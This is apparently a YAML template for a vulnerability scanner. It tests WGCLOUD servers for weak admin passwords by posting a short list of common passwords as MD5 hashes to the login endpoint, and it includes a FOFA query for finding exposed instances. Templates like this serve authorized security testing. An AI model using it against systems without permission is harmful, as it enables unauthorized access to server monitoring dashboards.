id: poc-yaml-wgcloud-weak-password
info:
  name: WGCLOUD 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: wgcloud
  fofa: body="WGCLOUD"
variables:
  passwd: 'md5(111111)

    md5(admin123)

    md5(mall123)

    md5(promotion123)'
firstRequest:
  method: GET
  path: /login/toLogin
  expression: status_code == 200 && contains(body,"WGCLOUD")
requests:
- method: POST
  path: /login/login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: userName=admin&passwd=********&md5pwd={{.passwd}}
  expression: status_code == 302 && body == "" && contains(headers,"/dash/main") &&
    contains(headers,"wgcloud-server=")
transport: http
